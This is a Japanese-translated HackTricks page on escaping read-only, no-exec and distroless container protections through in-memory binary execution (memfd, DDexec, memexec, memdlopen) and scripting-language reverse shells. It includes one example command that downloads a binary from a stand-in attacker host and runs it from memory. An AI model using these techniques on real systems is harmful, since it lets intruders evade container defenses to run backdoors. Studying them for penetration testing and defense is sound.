# FS protections を bypass: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}


## Videos

以下の Videos では、このページで説明している techniques をより詳しく解説しています。

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

特に containers では、**read-only (ro) file system protection** が設定された Linux machines に遭遇することがますます一般的になっています。これは、`securitycontext` に **`readOnlyRootFilesystem: true`** を設定するだけで、file system が ro の container を実行できるためです。

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

ただし、file system が ro として mount されていても、**`/dev/shm`** は writable のままです。そのため、disk に何も書き込めないというのは誤りです。しかし、この folder には **no-exec protection** が設定されるため、ここに binary を download しても **execute できません**。

> [!WARNING]
> red team の観点では、system にすでに存在しない binary（backdoor や `kubectl` のような enumerator など）を **download して execute することが難しくなります**。

## 最も簡単な bypass: Scripts

ここでは binary について説明しましたが、interpreter が machine 内に存在していれば、任意の script を **execute できます**。たとえば、`sh` が存在する場合は **shell script**、`python` が install されている場合は **python** **script** を実行できます。

しかし、これは binary backdoor や、実行する必要があるその他の binary tools を execute するには十分ではありません。

## Memory Bypasses

binary を execute したいにもかかわらず file system がそれを許可しない場合、最善の方法は **memory から execute すること**です。これは、**protections が memory 内には適用されないため**です。

### FD + exec syscall bypass

machine 内に **Python**、**Perl**、**Ruby** などの強力な script engines があれば、execute する binary を memory に download し、memory file descriptor（`create_memfd` syscall）に保存できます。この file descriptor はこれらの protections の対象にならないため、その後、**fd を execute する file として指定して** **`exec` syscall** を呼び出します。

これには [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) project を簡単に使用できます。binary を渡すと、指定した language で script を生成します。この script には、**compressed and b64 encoded** された **binary**、それを **decode and decompress** する instructions、`create_memfd` syscall を呼び出して作成した **fd** に保存する処理、さらに実行するための **exec** syscall の呼び出しが含まれます。

> [!WARNING]
> これは PHP や Node など、他の scripting languages では動作しません。これらには script から raw syscalls を呼び出す **default の方法がない**ため、binary を保存する **memory fd** を作成するために `create_memfd` を呼び出すことができません。
>
> さらに、`/dev/shm` 内の file を使用して **regular fd** を作成しても動作しません。**no-exec protection** が適用されるため、それを実行できないからです。

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) は、独自 process の **`/proc/self/mem`** を上書きして、その **memory を modify できる** technique です。

したがって、process が実行している **assembly code** を **control** することで、**shellcode** を書き込み、process を「mutate」して **任意の code を execute できます**。

> [!TIP]
> **DDexec / EverythingExec** を使用すると、独自の **shellcode** や **任意の binary** を **memory** から load して **execute** できます。
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
この technique の詳細については、Github または以下を確認してください:


{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) は DDexec の自然な次のステップです。これは **DDexec shellcode demonised** であるため、**別の binary を実行**するたびに DDexec を再起動する必要はありません。DDexec technique を使って memexec shellcode を実行し、この **deamon と通信してロードおよび実行する新しい binary を渡す**だけです。

[https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) に、**PHP reverse shell から binary を実行するために memexec を使用する方法**の例があります。

### Memdlopen

DDexec と同様の目的で、[**memdlopen**](https://github.com/arget13/memdlopen) technique を使うと、binary を memory にロードして後から実行することがより簡単になります。依存関係のある binary もロードできる可能性があります。

## Distroless Bypass

**distroless が実際には何であるか**、いつ役立つのか、いつ役立たないのか、そして container における post-exploitation の tradecraft をどのように変えるのかについて詳しくは、以下を確認してください:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### distroless とは

Distroless container には、library や runtime dependency など、**特定の application や service の実行に必要な最小限の component**だけが含まれ、package manager、shell、system utility などの大きな component は除外されています。

Distroless container の目的は、**不要な component を排除して container の attack surface を縮小し**、悪用可能な vulnerability の数を最小限に抑えることです。

### Reverse Shell

Distroless container では、通常の shell を取得するための **`sh` や `bash` すら見つからない**ことがあります。また、`ls`、`whoami`、`id` などの binary も見つかりません。つまり、system 上で通常実行するものが何もありません。

> [!WARNING]
> そのため、通常のように **reverse shell** を取得したり、system を **enumerate** したりすることはできません。

ただし、侵害した container が例えば flask web を実行している場合、python がインストールされているため、**Python reverse shell** を取得できます。node を実行している場合は Node rev shell を取得でき、ほとんどすべての **scripting language** でも同様です。

> [!TIP]
> scripting language を使用すれば、その language の機能を使って **system を enumerate** できます。

**`read-only/no-exec`** protection がない場合は、reverse shell を悪用して **file system に binary を書き込み**、それらを **execute** できます。

> [!TIP]
> ただし、この種の container には通常これらの protection が存在します。その場合は、**以前の memory execution technique を使って bypass**できます。

[**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) に、いくつかの **RCE vulnerability を exploit**して scripting language の **reverse shell**を取得し、memory から binary を実行する方法の**例**があります。


{{#include ../../../../banners/hacktricks-training.md}}
